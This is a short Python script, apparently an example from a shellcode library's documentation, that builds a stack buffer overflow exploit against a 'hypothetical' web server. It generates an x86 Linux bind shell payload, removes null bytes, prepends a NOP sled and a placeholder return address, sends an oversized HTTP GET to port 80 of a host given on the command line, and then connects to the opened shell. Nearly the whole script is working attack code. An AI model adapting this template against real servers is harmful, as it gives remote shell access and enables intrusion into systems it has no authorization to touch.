# Example using a hypothetical vulnerability in a web server.

from shellgen.x86.linux.bindshell import BindShell
from shellgen.x86.nop import Nop
from shellgen.x86.nullfree import NullFreeEncoder
from shellgen.util import connect_to_shell

from time import sleep
from socket import *
from struct import pack
from sys import argv

# Check the command line argument.
if len(argv) < 2:
    from os.path import basename
    print "./%s <hostname>" % basename(argv[0])
    exit(1)

# x86 bind shell payload.
payload = BindShell()

# Get the bindshell port number.
port = payload.port

# Encode to avoid nulls if needed.
if "\x00" in payload.bytes:
    payload = NullFreeEncoder(payload)

# Put a 20 byte NOP sled before the payload.
payload = Nop(20) + payload

# Return address.
address = pack("<L", 0x11223344)

# Buffer to exploit the vulnerability.
buffer = "GET /" + ("A" * 1024) + address + payload.bytes + " HTTP/1.0\r\n\r\n"

# Connect to the target server and send the payload.
s = socket()
try:
    s.connect( (argv[1], 80) )
    try:
        s.sendall(buffer)
        sleep(1)
    finally:
        s.shutdown(2)
finally:
    s.close()

# Connect to the bind shell.
connect_to_shell(argv[1], port)
